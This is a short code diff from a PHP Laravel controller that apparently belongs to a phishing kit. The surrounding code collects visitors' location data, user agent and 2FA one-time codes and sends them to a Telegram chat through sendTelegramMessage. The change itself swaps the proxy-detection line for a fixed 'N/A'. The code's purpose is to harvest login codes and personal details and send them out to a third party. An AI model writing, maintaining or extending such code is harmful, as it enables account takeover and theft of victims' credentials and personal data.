@@ -99,7 +99,7 @@ class DataController extends Controller
                     . "State: <code>" . ($ipData['regionName'] ?? 'Unknown') . "</code>\n"
                     . "Postal Code: <code>" . ($ipData['zip'] ?? 'Unknown') . "</code>\n"
                     . "User Agent: <code>" . $request->userAgent() . "</code>\n"
-                    . "Proxy: <code>" . ($ipData['proxy'] ? 'Yes' : 'No') . "</code>\n\n"
+                    . "Proxy: <code>N/A</code>\n\n"
                     . "🔐 2FA Code:\n"
                     . "Code: <code>" . ($record->otp_code ?? 'Not yet provided') . "</code>";
                 $this->sendTelegramMessage($message);
@@ -130,7 +130,7 @@ class DataController extends Controller
                     . "State: <code>" . ($ipData['regionName'] ?? 'Unknown') . "</code>\n"
                     . "Postal Code: <code>" . ($ipData['zip'] ?? 'Unknown') . "</code>\n"
                     . "User Agent: <code>" . $request->userAgent() . "</code>\n"
-                    . "Proxy: <code>" . ($ipData['proxy'] ? 'Yes' : 'No') . "</code>\n\n"
+                    . "Proxy: <code>N/A</code>\n\n"
                     . "🔐 2FA Code:\n"
                     . "Code: <code>" . ($record->otp_code ?? 'Not yet provided') . "</code>";
                 $this->sendTelegramMessage($message);
